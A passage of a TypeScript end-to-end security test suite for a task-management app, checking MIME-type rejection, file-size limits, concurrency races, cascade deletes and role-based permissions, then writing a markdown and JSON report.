	const [res1, dur1] = await measure(() =>
		fetch(`${BASE}/api/v1/files/presign`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				taskId: uploadTaskId,
				fileName: 'malware.exe',
				mimeType: 'application/x-executable',
				fileSize: 1024
			})
		})
	);
	await res1.text();
	if (res1.status === 400) {
		record('MIME', 'Upload with application/x-executable (should 400)', 'PASS', 'Correctly rejected', dur1, res1.status);
	} else {
		record('MIME', 'Upload with application/x-executable (should 400)', 'FAIL', `Expected 400, got ${res1.status}`, dur1, res1.status);
	}

	// 5b. Try to upload with disallowed MIME type: text/html
	const [res2, dur2] = await measure(() =>
		fetch(`${BASE}/api/v1/files/presign`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				taskId: uploadTaskId,
				fileName: 'phishing.html',
				mimeType: 'text/html',
				fileSize: 2048
			})
		})
	);
	await res2.text();
	if (res2.status === 400) {
		record('MIME', 'Upload with text/html (should 400)', 'PASS', 'Correctly rejected', dur2, res2.status);
	} else {
		record('MIME', 'Upload with text/html (should 400)', 'FAIL', `Expected 400, got ${res2.status}`, dur2, res2.status);
	}

	// 5c. Try to upload with disallowed MIME type: application/x-sh
	const [res2b, dur2b] = await measure(() =>
		fetch(`${BASE}/api/v1/files/presign`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				taskId: uploadTaskId,
				fileName: 'exploit.sh',
				mimeType: 'application/x-sh',
				fileSize: 512
			})
		})
	);
	await res2b.text();
	if (res2b.status === 400) {
		record('MIME', 'Upload with application/x-sh (should 400)', 'PASS', 'Correctly rejected', dur2b, res2b.status);
	} else {
		record('MIME', 'Upload with application/x-sh (should 400)', 'FAIL', `Expected 400, got ${res2b.status}`, dur2b, res2b.status);
	}

	// 5d. Try to upload with allowed MIME type: image/png
	const [res3, dur3] = await measure(() =>
		fetch(`${BASE}/api/v1/files/presign`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				taskId: uploadTaskId,
				fileName: 'screenshot.png',
				mimeType: 'image/png',
				fileSize: 1024000
			})
		})
	);
	// Should succeed (201) or fail with 500 if no S3 configured
	if (res3.status === 201) {
		const body = await res3.json();
		record('MIME', 'Upload with image/png (should work)', 'PASS', `Presigned URL generated, attachment id=${body.attachment?.id}`, dur3, res3.status);
	} else if (res3.status === 500) {
		await res3.text();
		record('MIME', 'Upload with image/png (should work or 500 if no S3)', 'PASS', '500 expected when S3 not configured (MIME check passed)', dur3, res3.status);
	} else {
		await res3.text();
		record('MIME', 'Upload with image/png (should work)', 'FAIL', `Expected 201 or 500, got ${res3.status}`, dur3, res3.status);
	}

	// 5e. Try to upload with allowed MIME type: application/pdf
	const [res4, dur4] = await measure(() =>
		fetch(`${BASE}/api/v1/files/presign`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				taskId: uploadTaskId,
				fileName: 'report.pdf',
				mimeType: 'application/pdf',
				fileSize: 5242880
			})
		})
	);
	if (res4.status === 201 || res4.status === 500) {
		await res4.text();
		record('MIME', 'Upload with application/pdf (should work or 500)', 'PASS', `Status ${res4.status} (MIME check passed)`, dur4, res4.status);
	} else {
		await res4.text();
		record('MIME', 'Upload with application/pdf (should work)', 'FAIL', `Expected 201 or 500, got ${res4.status}`, dur4, res4.status);
	}

	// 5f. File size exactly at limit (100MB)
	const [res5, dur5] = await measure(() =>
		fetch(`${BASE}/api/v1/files/presign`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				taskId: uploadTaskId,
				fileName: 'big.zip',
				mimeType: 'application/zip',
				fileSize: 100 * 1024 * 1024 // Exactly 100MB
			})
		})
	);
	// 100MB is exactly the max per the schema (.max(100 * 1024 * 1024))
	if (res5.status === 201 || res5.status === 500) {
		await res5.text();
		record('MIME', 'Upload with 100MB file (exactly at limit)', 'PASS', `Status ${res5.status}`, dur5, res5.status);
	} else {
		await res5.text();
		record('MIME', 'Upload with 100MB file (exactly at limit)', 'FAIL', `Expected 201/500, got ${res5.status}`, dur5, res5.status);
	}

	// 5g. File size over limit (100MB + 1 byte)
	const [res6, dur6] = await measure(() =>
		fetch(`${BASE}/api/v1/files/presign`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				taskId: uploadTaskId,
				fileName: 'too-big.zip',
				mimeType: 'application/zip',
				fileSize: 100 * 1024 * 1024 + 1
			})
		})
	);
	await res6.text();
	if (res6.status === 400) {
		record('MIME', 'Upload with 100MB+1 file (over limit)', 'PASS', 'Correctly rejected', dur6, res6.status);
	} else {
		record('MIME', 'Upload with 100MB+1 file (over limit)', 'FAIL', `Expected 400, got ${res6.status}`, dur6, res6.status);
	}
}

// ──────────────────────────────────────────────
// 6. Concurrent Operations Tests
// ──────────────────────────────────────────────

async function testConcurrentOperations() {
	console.log('\n=======================================');
	console.log('  6. CONCURRENT OPERATIONS TESTS');
	console.log('=======================================');

	// 6a. Create 5 tasks concurrently and verify all get unique displayIds
	const [results, dur1] = await measure(async () => {
		const promises = Array.from({ length: 5 }, (_, i) =>
			fetch(`${BASE}/api/v1/tasks`, {
				method: 'POST',
				headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
				body: JSON.stringify({
					projectId: projectAId,
					columnId: projectAColumnId,
					title: `Concurrent Task ${i + 1}`
				})
			}).then(async (r) => ({ status: r.status, body: await r.json() }))
		);
		return Promise.all(promises);
	});

	const createdTasks = results.filter((r) => r.status === 201);
	const displayIds = createdTasks.map((r) => r.body.displayId);
	const uniqueDisplayIds = new Set(displayIds);

	if (createdTasks.length === 5 && uniqueDisplayIds.size === 5) {
		record('Concurrent', 'Create 5 tasks concurrently (unique displayIds)', 'PASS', `All unique: ${[...uniqueDisplayIds].join(', ')}`, dur1);
	} else if (createdTasks.length === 5 && uniqueDisplayIds.size < 5) {
		record('Concurrent', 'Create 5 tasks concurrently (unique displayIds)', 'FAIL', `Only ${uniqueDisplayIds.size}/5 unique displayIds: ${displayIds.join(', ')}`, dur1);
	} else {
		record('Concurrent', 'Create 5 tasks concurrently (unique displayIds)', 'FAIL', `Only ${createdTasks.length}/5 tasks created`, dur1);
	}

	// 6b. Start timer on same task from 2 different requests concurrently
	let timerTestTaskId = '';
	try {
		const t = await createTask(userACookie, projectAId, projectAColumnId, 'Timer concurrency test');
		timerTestTaskId = t.id;
	} catch (e: any) {
		record('Concurrent', 'Create task for timer test', 'FAIL', e.message, 0);
	}

	if (timerTestTaskId) {
		const [timerResults, dur2] = await measure(async () => {
			const p1 = fetch(`${BASE}/api/v1/time-entries`, {
				method: 'POST',
				headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
				body: JSON.stringify({ taskId: timerTestTaskId, note: 'Timer 1' })
			}).then(async (r) => ({ status: r.status, body: await r.json() }));

			const p2 = fetch(`${BASE}/api/v1/time-entries`, {
				method: 'POST',
				headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
				body: JSON.stringify({ taskId: timerTestTaskId, note: 'Timer 2' })
			}).then(async (r) => ({ status: r.status, body: await r.json() }));

			return Promise.all([p1, p2]);
		});

		const successes = timerResults.filter((r) => r.status === 201);
		const conflicts = timerResults.filter((r) => r.status === 409 || r.status === 400);

		if (successes.length === 1 && conflicts.length === 1) {
			record('Concurrent', 'Start 2 timers concurrently on same task (one succeeds)', 'PASS', `1 succeeded (201), 1 conflicted (${conflicts[0].status})`, dur2);
		} else if (successes.length === 2) {
			// Both succeeded due to race condition -- the transaction might allow it
			// This is an informational finding
			record('Concurrent', 'Start 2 timers concurrently on same task', 'FAIL', `Both timers started (race condition) -- ${successes.length} successes`, dur2);
		} else {
			record('Concurrent', 'Start 2 timers concurrently on same task', 'FAIL', `Unexpected: ${successes.length} successes, ${conflicts.length} conflicts`, dur2);
		}

		// Clean up: stop any running timers
		for (const s of successes) {
			if (s.body.id) {
				await fetch(`${BASE}/api/v1/time-entries`, {
					method: 'PATCH',
					headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
					body: JSON.stringify({ id: s.body.id })
				});
			}
		}
	}
}

// ──────────────────────────────────────────────
// 7. Cascade Delete Tests
// ──────────────────────────────────────────────

async function testCascadeDelete() {
	console.log('\n=======================================');
	console.log('  7. CASCADE DELETE TESTS');
	console.log('=======================================');

	// Create a fresh project with tasks, comments, and time entries
	let cascadeProjectId = '';
	let cascadeTaskId = '';
	let cascadeCommentId = '';
	let cascadeTimeEntryId = '';
	let cascadeColumnId = '';

	try {
		cascadeProjectId = await createProject(userACookie, 'Cascade Delete Test Project');
		cascadeColumnId = await getFirstColumnId(cascadeProjectId);

		const task = await createTask(userACookie, cascadeProjectId, cascadeColumnId, 'Cascade test task');
		cascadeTaskId = task.id;

		// Create a comment
		const commentRes = await fetch(`${BASE}/api/v1/comments`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({ taskId: cascadeTaskId, body: 'Cascade test comment' })
		});
		const comment = await commentRes.json();
		cascadeCommentId = comment.id;

		// Create a time entry
		const teRes = await fetch(`${BASE}/api/v1/time-entries`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({ taskId: cascadeTaskId, note: 'Cascade test timer' })
		});
		const te = await teRes.json();
		cascadeTimeEntryId = te.id;

		// Stop the timer
		await new Promise((r) => setTimeout(r, 500));
		await fetch(`${BASE}/api/v1/time-entries`, {
			method: 'PATCH',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({ id: cascadeTimeEntryId })
		});

		// Create a label for this project
		await fetch(`${BASE}/api/v1/labels`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({ projectId: cascadeProjectId, name: 'cascade-label', color: '#ff0000' })
		});

		record('CascadeDelete', 'Setup: project with task, comment, time entry, label', 'PASS', `project=${cascadeProjectId}, task=${cascadeTaskId}`, 0);
	} catch (e: any) {
		record('CascadeDelete', 'Setup cascade test data', 'FAIL', e.message, 0);
		return;
	}

	// Delete the project directly via DB (since no delete endpoint exists)
	const [_, dur1] = await measure(async () => {
		const { createClient } = await import('@libsql/client');
		const client = createClient({ url: 'file:./local.db' });
		await client.execute({
			sql: 'DELETE FROM projects WHERE id = ?',
			args: [cascadeProjectId]
		});
		client.close();
	});

	record('CascadeDelete', 'Delete project via DB', 'PASS', `Deleted project ${cascadeProjectId}`, dur1);

	// Verify cascade: tasks should be deleted
	try {
		const { createClient } = await import('@libsql/client');
		const client = createClient({ url: 'file:./local.db' });

		// Check tasks
		const taskResult = await client.execute({
			sql: 'SELECT COUNT(*) as cnt FROM tasks WHERE project_id = ?',
			args: [cascadeProjectId]
		});
		const taskCount = taskResult.rows[0].cnt as number;
		if (taskCount === 0) {
			record('CascadeDelete', 'Tasks deleted on project delete', 'PASS', 'No orphaned tasks', 0);
		} else {
			record('CascadeDelete', 'Tasks deleted on project delete', 'FAIL', `${taskCount} orphaned tasks remain`, 0);
		}

		// Check comments (should cascade from task delete)
		const commentResult = await client.execute({
			sql: 'SELECT COUNT(*) as cnt FROM comments WHERE task_id = ?',
			args: [cascadeTaskId]
		});
		const commentCount = commentResult.rows[0].cnt as number;
		if (commentCount === 0) {
			record('CascadeDelete', 'Comments deleted on task cascade', 'PASS', 'No orphaned comments', 0);
		} else {
			record('CascadeDelete', 'Comments deleted on task cascade', 'FAIL', `${commentCount} orphaned comments remain`, 0);
		}

		// Check time entries (should cascade from task delete)
		const teResult = await client.execute({
			sql: 'SELECT COUNT(*) as cnt FROM time_entries WHERE task_id = ?',
			args: [cascadeTaskId]
		});
		const teCount = teResult.rows[0].cnt as number;
		if (teCount === 0) {
			record('CascadeDelete', 'Time entries deleted on task cascade', 'PASS', 'No orphaned time entries', 0);
		} else {
			record('CascadeDelete', 'Time entries deleted on task cascade', 'FAIL', `${teCount} orphaned time entries remain`, 0);
		}

		// Check columns (should cascade from project delete)
		const colResult = await client.execute({
			sql: 'SELECT COUNT(*) as cnt FROM columns WHERE project_id = ?',
			args: [cascadeProjectId]
		});
		const colCount = colResult.rows[0].cnt as number;
		if (colCount === 0) {
			record('CascadeDelete', 'Columns deleted on project delete', 'PASS', 'No orphaned columns', 0);
		} else {
			record('CascadeDelete', 'Columns deleted on project delete', 'FAIL', `${colCount} orphaned columns remain`, 0);
		}

		// Check labels (should cascade from project delete)
		const labelResult = await client.execute({
			sql: 'SELECT COUNT(*) as cnt FROM labels WHERE project_id = ?',
			args: [cascadeProjectId]
		});
		const labelCount = labelResult.rows[0].cnt as number;
		if (labelCount === 0) {
			record('CascadeDelete', 'Labels deleted on project delete', 'PASS', 'No orphaned labels', 0);
		} else {
			record('CascadeDelete', 'Labels deleted on project delete', 'FAIL', `${labelCount} orphaned labels remain`, 0);
		}

		// Check project_members (should cascade from project delete)
		const memberResult = await client.execute({
			sql: 'SELECT COUNT(*) as cnt FROM project_members WHERE project_id = ?',
			args: [cascadeProjectId]
		});
		const memberCount = memberResult.rows[0].cnt as number;
		if (memberCount === 0) {
			record('CascadeDelete', 'Project members deleted on project delete', 'PASS', 'No orphaned members', 0);
		} else {
			record('CascadeDelete', 'Project members deleted on project delete', 'FAIL', `${memberCount} orphaned members remain`, 0);
		}

		// Check activity_log (should cascade from project delete)
		const actResult = await client.execute({
			sql: 'SELECT COUNT(*) as cnt FROM activity_log WHERE project_id = ?',
			args: [cascadeProjectId]
		});
		const actCount = actResult.rows[0].cnt as number;
		if (actCount === 0) {
			record('CascadeDelete', 'Activity log deleted on project delete', 'PASS', 'No orphaned activity logs', 0);
		} else {
			record('CascadeDelete', 'Activity log deleted on project delete', 'FAIL', `${actCount} orphaned activity logs remain`, 0);
		}

		// Check project_counters (should cascade from project delete)
		const counterResult = await client.execute({
			sql: 'SELECT COUNT(*) as cnt FROM project_counters WHERE project_id = ?',
			args: [cascadeProjectId]
		});
		const counterCount = counterResult.rows[0].cnt as number;
		if (counterCount === 0) {
			record('CascadeDelete', 'Project counters deleted on project delete', 'PASS', 'No orphaned counters', 0);
		} else {
			record('CascadeDelete', 'Project counters deleted on project delete', 'FAIL', `${counterCount} orphaned counters remain`, 0);
		}

		client.close();
	} catch (e: any) {
		record('CascadeDelete', 'Verify cascade deletions', 'FAIL', `DB error: ${e.message}`, 0);
	}
}

// ──────────────────────────────────────────────
// 8. Role-Based Access Tests
// ──────────────────────────────────────────────

async function testRoleBasedAccess() {
	console.log('\n=======================================');
	console.log('  8. ROLE-BASED ACCESS TESTS');
	console.log('=======================================');

	// Create fresh users for role testing
	let ownerCookie = '';
	let memberCookie = '';
	let viewerCookie = '';
	let ownerEmail = '';
	let memberEmail = '';
	let viewerEmail = '';
	let roleProjectId = '';
	let roleColumnId = '';

	try {
		ownerCookie = await registerUser('Role Owner', 'role-owner');
		memberCookie = await registerUser('Role Member', 'role-member');
		viewerCookie = await registerUser('Role Viewer', 'role-viewer');

		const ownerMe = await getMe(ownerCookie);
		ownerEmail = ownerMe.email;
		const memberMe = await getMe(memberCookie);
		memberEmail = memberMe.email;
		const viewerMe = await getMe(viewerCookie);
		viewerEmail = viewerMe.email;

		// Create project as owner
		roleProjectId = await createProject(ownerCookie, 'Role Test Project');
		roleColumnId = await getFirstColumnId(roleProjectId);

		// Invite member with 'member' role
		await inviteUserToProject(ownerCookie, roleProjectId, memberEmail, 'member');

		// Invite viewer with 'viewer' role
		await inviteUserToProject(ownerCookie, roleProjectId, viewerEmail, 'viewer');

		record('RBAC', 'Setup: owner, member, viewer for role project', 'PASS', `project=${roleProjectId}`, 0);
	} catch (e: any) {
		record('RBAC', 'Setup role test users and project', 'FAIL', e.message, 0);
		return;
	}

	// Small pause before creating tasks
	await delay(500);

	// Create some tasks as the owner
	let roleTaskId1 = '';
	let roleTaskId2 = '';
	let roleTaskId3 = '';

	try {
		const t1 = await createTask(ownerCookie, roleProjectId, roleColumnId, 'Owner created task 1');
		roleTaskId1 = t1.id;
		await delay(300);
		const t2 = await createTask(ownerCookie, roleProjectId, roleColumnId, 'Owner created task 2');
		roleTaskId2 = t2.id;
		await delay(300);
		const t3 = await createTask(ownerCookie, roleProjectId, roleColumnId, 'Owner created task 3');
		roleTaskId3 = t3.id;
		record('RBAC', 'Create 3 tasks as owner', 'PASS', `task1=${roleTaskId1}, task2=${roleTaskId2}, task3=${roleTaskId3}`, 0);
	} catch (e: any) {
		record('RBAC', 'Create tasks as owner', 'FAIL', e.message, 0);
		return;
	}

	// 8a. Owner can delete tasks
	const [res1, dur1] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks/${roleTaskId1}`, {
			method: 'DELETE',
			headers: { Cookie: ownerCookie }
		})
	);
	const body1 = await res1.json();
	if (res1.ok && body1.success) {
		record('RBAC', 'Owner can delete tasks', 'PASS', 'Task deleted successfully', dur1, res1.status);
	} else {
		record('RBAC', 'Owner can delete tasks', 'FAIL', `status=${res1.status}`, dur1, res1.status);
	}

	// 8b. Member can delete tasks
	const [res2, dur2] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks/${roleTaskId2}`, {
			method: 'DELETE',
			headers: { Cookie: memberCookie }
		})
	);
	const body2 = await res2.json();
	if (res2.ok && body2.success) {
		record('RBAC', 'Member can delete tasks', 'PASS', 'Task deleted successfully', dur2, res2.status);
	} else {
		record('RBAC', 'Member can delete tasks', 'FAIL', `status=${res2.status}`, dur2, res2.status);
	}

	// 8c. Viewer CANNOT delete tasks (should get 403)
	const [res3, dur3] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks/${roleTaskId3}`, {
			method: 'DELETE',
			headers: { Cookie: viewerCookie }
		})
	);
	await res3.text();
	if (res3.status === 403) {
		record('RBAC', 'Viewer CANNOT delete tasks (should 403)', 'PASS', 'Correctly denied', dur3, res3.status);
	} else {
		record('RBAC', 'Viewer CANNOT delete tasks (should 403)', 'FAIL', `Expected 403, got ${res3.status}`, dur3, res3.status);
	}

	// 8d. Viewer CAN read tasks
	const [res4, dur4] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks?projectId=${roleProjectId}`, {
			headers: { Cookie: viewerCookie }
		})
	);
	const tasksRes4 = await res4.json();
	const tasksList4 = tasksRes4.data ?? tasksRes4;
	if (res4.ok && Array.isArray(tasksList4)) {
		record('RBAC', 'Viewer CAN read tasks', 'PASS', `${tasksList4.length} tasks visible`, dur4, res4.status);
	} else {
		record('RBAC', 'Viewer CAN read tasks', 'FAIL', `status=${res4.status}`, dur4, res4.status);
	}

	// 8e. Viewer CAN read a single task
	const [res4b, dur4b] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks/${roleTaskId3}`, {
			headers: { Cookie: viewerCookie }
		})
	);
	const singleTask = await res4b.json();
	if (res4b.ok && singleTask.id === roleTaskId3) {
		record('RBAC', 'Viewer CAN read single task', 'PASS', `task=${roleTaskId3}`, dur4b, res4b.status);
	} else {
		record('RBAC', 'Viewer CAN read single task', 'FAIL', `status=${res4b.status}`, dur4b, res4b.status);
	}

	// 8f. Viewer CAN create comments
	const [res5, dur5] = await measure(() =>
		fetch(`${BASE}/api/v1/comments`, {
			method: 'POST',
			headers: { Cookie: viewerCookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({ taskId: roleTaskId3, body: 'Viewer comment -- should be allowed' })
		})
	);
	const comment5 = await res5.json();
	if (res5.status === 201 && comment5.id) {
		record('RBAC', 'Viewer CAN create comments', 'PASS', `comment=${comment5.id}`, dur5, res5.status);
	} else {
		record('RBAC', 'Viewer CAN create comments', 'FAIL', `status=${res5.status}`, dur5, res5.status);
	}

	// 8g. Viewer CANNOT update project settings
	const formUpdate = new URLSearchParams();
	formUpdate.set('name', 'Viewer Hijacked Name');

	const [res6, dur6] = await measure(() =>
		fetch(`${BASE}/projects/${roleProjectId}/settings?/update`, {
			method: 'POST',
			headers: {
				Cookie: viewerCookie,
				'Content-Type': 'application/x-www-form-urlencoded',
				...ORIGIN_HEADER
			},
			body: formUpdate.toString(),
			redirect: 'manual'
		})
	);
	const body6 = await res6.text();
	const isFailure6 = res6.status === 403 || body6.includes('"failure"') || body6.includes('Forbidden');
	if (isFailure6) {
		record('RBAC', 'Viewer CANNOT update project settings', 'PASS', 'Settings update denied for viewer', dur6, res6.status);
	} else {
		record('RBAC', 'Viewer CANNOT update project settings', 'FAIL', `Expected failure, got status=${res6.status}`, dur6, res6.status);
	}

	// 8h. Member CAN create tasks
	const [res7, dur7] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks`, {
			method: 'POST',
			headers: { Cookie: memberCookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				projectId: roleProjectId,
				columnId: roleColumnId,
				title: 'Member-created task'
			})
		})
	);
	const memberTask = await res7.json();
	if (res7.status === 201 && memberTask.id) {
		record('RBAC', 'Member CAN create tasks', 'PASS', `task=${memberTask.id}`, dur7, res7.status);
	} else {
		record('RBAC', 'Member CAN create tasks', 'FAIL', `status=${res7.status}`, dur7, res7.status);
	}

	// 8i. Member CANNOT update project settings (only owner/admin)
	const formUpdate2 = new URLSearchParams();
	formUpdate2.set('name', 'Member Hijacked Name');

	const [res8, dur8] = await measure(() =>
		fetch(`${BASE}/projects/${roleProjectId}/settings?/update`, {
			method: 'POST',
			headers: {
				Cookie: memberCookie,
				'Content-Type': 'application/x-www-form-urlencoded',
				...ORIGIN_HEADER
			},
			body: formUpdate2.toString(),
			redirect: 'manual'
		})
	);
	const body8 = await res8.text();
	const isFailure8 = res8.status === 403 || body8.includes('"failure"') || body8.includes('Forbidden');
	if (isFailure8) {
		record('RBAC', 'Member CANNOT update project settings', 'PASS', 'Settings update denied for member', dur8, res8.status);
	} else {
		record('RBAC', 'Member CANNOT update project settings', 'FAIL', `Expected failure, got status=${res8.status}`, dur8, res8.status);
	}

	// 8j. Member CANNOT invite users (only owner/admin)
	const formInvite = new URLSearchParams();
	formInvite.set('email', 'randomperson@test.com');
	formInvite.set('role', 'member');

	const [res9, dur9] = await measure(() =>
		fetch(`${BASE}/projects/${roleProjectId}/settings?/invite`, {
			method: 'POST',
			headers: {
				Cookie: memberCookie,
				'Content-Type': 'application/x-www-form-urlencoded',
				...ORIGIN_HEADER
			},
			body: formInvite.toString(),
			redirect: 'manual'
		})
	);
	const body9 = await res9.text();
	const isFailure9 = res9.status === 403 || body9.includes('"failure"') || body9.includes('Forbidden');
	if (isFailure9) {
		record('RBAC', 'Member CANNOT invite users', 'PASS', 'Invitation denied for member role', dur9, res9.status);
	} else {
		record('RBAC', 'Member CANNOT invite users', 'FAIL', `Expected failure, got status=${res9.status}`, dur9, res9.status);
	}
}

// ──────────────────────────────────────────────
// Report Generator
// ──────────────────────────────────────────────

function generateReport(): string {
	const passed = RESULTS.filter((r) => r.status === 'PASS').length;
	const failed = RESULTS.filter((r) => r.status === 'FAIL').length;
	const skipped = RESULTS.filter((r) => r.status === 'SKIP').length;
	const total = RESULTS.length;
	const nonSkipped = total - skipped;

	const categories = [...new Set(RESULTS.map((r) => r.category))];

	let report = `# TaskMaster Pro -- Security & Edge-Case E2E Test Report

**Generated:** ${new Date().toISOString()}
**Server:** ${BASE}
**Total Tests:** ${total}
**Passed:** ${passed}
**Failed:** ${failed}
**Skipped:** ${skipped}
**Pass Rate:** ${nonSkipped > 0 ? ((passed / nonSkipped) * 100).toFixed(1) : 0}%

---

## Summary by Category

| Category | Passed | Failed | Skipped | Total |
|----------|--------|--------|---------|-------|
`;

	for (const cat of categories) {
		const catResults = RESULTS.filter((r) => r.category === cat);
		const p = catResults.filter((r) => r.status === 'PASS').length;
		const f = catResults.filter((r) => r.status === 'FAIL').length;
		const s = catResults.filter((r) => r.status === 'SKIP').length;
		report += `| ${cat} | ${p} | ${f} | ${s} | ${catResults.length} |\n`;
	}

	report += `\n---\n\n## Detailed Results\n\n`;

	for (const cat of categories) {
		report += `### ${cat}\n\n`;
		const catResults = RESULTS.filter((r) => r.category === cat);
		for (const r of catResults) {
			const status = r.status === 'PASS' ? 'PASS' : r.status === 'FAIL' ? 'FAIL' : 'SKIP';
			report += `- [${status}] **${r.test}**`;
			if (r.statusCode) report += ` [HTTP ${r.statusCode}]`;
			report += ` (${r.duration}ms)\n`;
			report += `  - ${r.detail}\n`;
		}
		report += '\n';
	}

	report += `---\n\n## Test Categories Covered\n\n`;
	report += `| # | Category | Description |\n`;
	report += `|---|----------|-------------|\n`;
	report += `| 1 | Authorization Bypass | Access control bypass attempts |\n`;
	report += `| 2 | Cross-Project Access | Isolation between user projects |\n`;
	report += `| 3 | Boundary Values | Input validation edge cases |\n`;
	report += `| 4 | XSS / Injection | Script injection and SQL injection |\n`;
	report += `| 5 | MIME Allowlist | File type restriction enforcement |\n`;
	report += `| 6 | Concurrent Operations | Race conditions and atomicity |\n`;
	report += `| 7 | Cascade Delete | Foreign key cascade integrity |\n`;
	report += `| 8 | Role-Based Access | Owner/member/viewer permissions |\n`;

	return report;
}

// ──────────────────────────────────────────────
// Main
// ──────────────────────────────────────────────

async function main() {
	console.log('========================================================');
	console.log('  TaskMaster Pro -- Security & Edge-Case E2E Test Suite');
	console.log('  Testing auth bypass, RBAC, injection, boundaries');
	console.log('========================================================');

	const start = performance.now();

	try {
		await setup();
		await testAuthorizationBypass();
		await testCrossProjectAccess();
		await testBoundaryValues();
		await testXssInjection();
		await testMimeTypeAllowlist();
		await testConcurrentOperations();
		await testCascadeDelete();

		// Pause to let the rate limit window (60 req / 60s) fully expire before RBAC tests
		// RBAC tests register 3 new users, create projects, and need many API calls
		console.log('\n    (Pausing 61s to let the 60s rate-limit window fully expire before RBAC tests...)');
		await delay(61000);

		await testRoleBasedAccess();
	} catch (err) {
		console.error('\nFATAL ERROR during test execution:', err);
	}

	const totalTime = Math.round(performance.now() - start);

	console.log('\n========================================================');
	console.log('  TEST RUN COMPLETE');
	console.log('========================================================');

	const passed = RESULTS.filter((r) => r.status === 'PASS').length;
	const failed = RESULTS.filter((r) => r.status === 'FAIL').length;
	const skipped = RESULTS.filter((r) => r.status === 'SKIP').length;
	const nonSkipped = RESULTS.length - skipped;

	console.log(`\n  Total: ${RESULTS.length} | Passed: ${passed} | Failed: ${failed} | Skipped: ${skipped}`);
	console.log(`  Duration: ${totalTime}ms`);
	console.log(`  Pass Rate: ${nonSkipped > 0 ? ((passed / nonSkipped) * 100).toFixed(1) : 0}%\n`);

	// Generate report
	const report = generateReport();

	// Write report files
	const fs = await import('fs');
	fs.writeFileSync('tests/E2E_SECURITY_TEST_REPORT.md', report);
	console.log('  Report written to tests/E2E_SECURITY_TEST_REPORT.md');

	fs.writeFileSync('tests/e2e-security-results.json', JSON.stringify(RESULTS, null, 2));
	console.log('  JSON results written to tests/e2e-security-results.json\n');

	// Exit with error code if any tests failed
	if (failed > 0) {
		process.exit(1);
	}
}

main();
